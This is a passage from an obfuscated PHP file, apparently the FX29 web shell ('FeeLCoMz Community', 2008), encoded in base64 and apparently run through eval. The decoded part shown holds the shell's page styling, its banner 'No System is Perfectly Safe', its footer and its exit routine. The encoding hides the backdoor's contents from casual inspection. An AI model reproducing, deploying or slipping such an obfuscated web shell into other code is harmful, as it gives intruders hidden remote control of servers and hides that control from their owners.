lYXJjaC5waHA/ZG9uZz0iLiRPU1YuIiAiLiRMdmVyc2lvbjsKICB9Cn0KZnVuY3Rpb24gdG9vbHMoKSB7CiAgZWNobyAiTGlzdCBvZiB0b29scyI7Cn0KCmZ1bmN0aW9uIHNoX25hbWUoKSB7IHJldHVybiBiYXNlNjRfZGVjb2RlKCJSZW1vdmVkIikuc2hfdmVyOyB9CmZ1bmN0aW9uIGh0bWxoZWFkKCRzYWZlbW9kZSkgewokc3R5bGUgPSAnCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHksdGFibGUge2ZvbnQ6OHB0IHZlcmRhbmE7YmFja2dyb3VuZC1jb2xvcjpibGFjazt9CnRhYmxlIHt3aWR0aDoxMDAlO30KdGFibGUsdGQsI21haW5pbmZvIHRkIHtwYWRkaW5nOjNweDt9CnRhYmxlLHRkLGlucHV0LHNlbGVjdCxvcHRpb24ge2JvcmRlcjoxcHggc29saWQgIzgwODA4MDt9CmJvZHksdGFibGUsaW5wdXQsc2VsZWN0LG9wdGlvbiB7Y29sb3I6I0ZGRkZGRjt9CmEge2NvbG9yOmxpZ2h0Ymx1ZTt0ZXh0LWRlY29yYXRpb246bm9uZTsgfSBhOmxpbmsge2NvbG9yOiM1QjVCRkY7fSBhOmhvdmVyIHt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lO30gYTp2aXNpdGVkIHtjb2xvcjojOTlDQ0ZGO30KdGV4dGFyZWEge2NvbG9yOiNkZWRiZGU7Zm9udDo4cHQgQ291cmllciBOZXc7Ym9yZGVyOjFweCBzb2xpZCAjNjY2NjY2O21hcmdpbjoyO30KI3BhZ2ViYXIge3BhZGRpbmc6NXB4O2JvcmRlcjozcHggc29saWQgIzFFMUUxRTtib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7fQojcGFnZWJhciB0ZCB7dmVydGljYWwtYWxpZ246dG9wO30KI3BhZ2ViYXIsI3BhZ2ViYXIgcCwuaW5mbyxpbnB1dCxzZWxlY3Qsb3B0aW9uIHtmb250OjhwdCB0YWhvbWE7fQojcGFnZWJhciBhIHtmb250LXdlaWdodDpib2xkO2NvbG9yOiMwMEZGMDA7fQojcGFnZWJhciBhOnZpc2l0ZWQge2NvbG9yOiMwMENFMDA7fQojbWFpbm1lbnUge3RleHQtYWxpZ246Y2VudGVyO30KI21haW5tZW51IGEge3RleHQtYWxpZ246IGNlbnRlcjtwYWRkaW5nOiAwcHggNXB4IDBweCA1cHg7fQojbWFpbmluZm8sLmJhcmhlYWRlciwuYmFydGl0bGUge3RleHQtYWxpZ246Y2VudGVyO30KLmZsZWZ0IHtmbG9hdDpsZWZ0O3RleHQtYWxpZ246bGVmdDt9Ci5mcmlnaHQge2Zsb2F0OnJpZ2h0O3RleHQtYWxpZ246cmlnaHQ7fQouYmFydGl0bGUge3BhZGRpbmc6NXB4O2JvcmRlcjoycHggc29saWQgIzFGMUYxRjt9Ci5iYXJoZWFkZXIge2ZvbnQtd2VpZ2h0OmJvbGQ7cGFkZGluZzo1cHg7fQouaW5mbywuaW5mbyB0ZCwuaW5mbyB0aCB7bWFyZ2luOjA7cGFkZGluZzowO2JvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTt9Ci5pbmZvIHRoIHtjb2xvcjojMDBGRjAwO3RleHQtYWxpZ246bGVmdDt3aWR0aDoxMyU7fQouY29udGVudHMsLmV4cGxvcmVyIHtib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7fQouY29udGVudHMsLmV4cGxvcmVyIHRkLHRoIHt2ZXJ0aWNhbC1hbGlnbjp0b3A7fQoubWFpbnBhbmVsIHtib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7cGFkZGluZzo1cHg7fQouYmFyaGVhZGVyLC5tYWlucGFuZWwgdGFibGUsdGQge2JvcmRlcjoxcHggc29saWQgIzMzMzMzMzt9CmlucHV0W3R5cGU9InN1Ym1pdCJdLGlucHV0W3R5cGU9ImJ1dHRvbiJdIHtib3JkZXI6MXB4IHNvbGlkICMwMDAwMDA7fQppbnB1dFt0eXBlPSJ0ZXh0Il0ge3BhZGRpbmc6M3B4O30KLnNoZWxsIHtiYWNrZ3JvdW5kLWNvbG9yOiMwMDAwMDA7Y29sb3I6IzAwRkYwMDtwYWRkaW5nOjVweDtmb250LXNpemU6MTI7fQouZnhlcnJtc2cge2NvbG9yOnJlZDsgZm9udC13ZWlnaHQ6Ym9sZDt9CiNwYWdlYmFyLCNwYWdlYmFyIHAsaDEsaDIsaDMsaDQsZm9ybSB7bWFyZ2luOjA7fQojcGFnZWJhciwubWFpbnBhbmVsLGlucHV0W3R5cGU9InN1Ym1pdCJdLGlucHV0W3R5cGU9ImJ1dHRvbiJdIHtiYWNrZ3JvdW5kLWNvbG9yOiM0QTRBNEE7fQouYmFydGl0bGUsaW5wdXQsc2VsZWN0LG9wdGlvbixpbnB1dFt0eXBlPSJzdWJtaXQiXTpob3ZlcixpbnB1dFt0eXBlPSJidXR0b24iXTpob3ZlciB7YmFja2dyb3VuZC1jb2xvcjojMzMzMzMzO30KdGV4dGFyZWEsI3BhZ2ViYXIgaW5wdXRbdHlwZT0idGV4dCJdLC5tYWlucGFuZWwgaW5wdXRbdHlwZT0idGV4dCJdLGlucHV0W3R5cGU9ImZpbGUiXSxzZWxlY3Qsb3B0aW9uIHtiYWNrZ3JvdW5kLWNvbG9yOiMwMDAwMDA7fQppbnB1dFt0eXBlPSJsYWJlbCJdIHsgdGV4dC1hbGlnbjpyaWdodDt9Ci5pbmZvLC5pbmZvIHRkLGlucHV0W3R5cGU9ImxhYmVsIl0ge2JvcmRlcjowO2JhY2tncm91bmQ6bm9uZTt9Cjwvc3R5bGU+Cic7CiRodG1sX3N0YXJ0ID0gJwo8aHRtbD48aGVhZD4KPHRpdGxlPicuZ2V0ZW52KCJIVFRQX0hPU1QiKS4nIC0gJy5zaF9uYW1lKCkuJzwvdGl0bGU+CicuJHN0eWxlLicKPC9oZWFkPgo8Ym9keT4KPGRpdiBjbGFzcz1iYXJ0aXRsZT48aDQ+Jy5zaF9uYW1lKCkuJzwvaDQ+LjogTm8gU3lzdGVtIGlzIFBlcmZlY3RseSBTYWZlIDouPC9kaXY+Cic7CnJldHVybiAkaHRtbF9zdGFydDsKfTsKZnVuY3Rpb24gZm9vdGVyKCkgewogIGVjaG8gIjxkaXYgY2xhc3M9YmFydGl0bGUgY29sc3Bhbj0yPjxmb250IHNpemU9MSBjb2xvcj0jMDBGRjAwPiBCeSBGYVRhTGlzVGlDel9GeCwg77+9IDIwMDggRmVlTENvTXogQ29tbXVuaXR5LCBHZW5lcmF0ZWQ6ICIucm91bmQoZ2V0bWljcm90aW1lKCktc3RhcnR0aW1lLDQpLiIgc2Vjb25kczwvZm9udD48L2Rpdj4iOwp9CmNoZGlyKCRsYXN0ZGlyKTsgZngyOXNoZXhpdCgpOwo='));
?>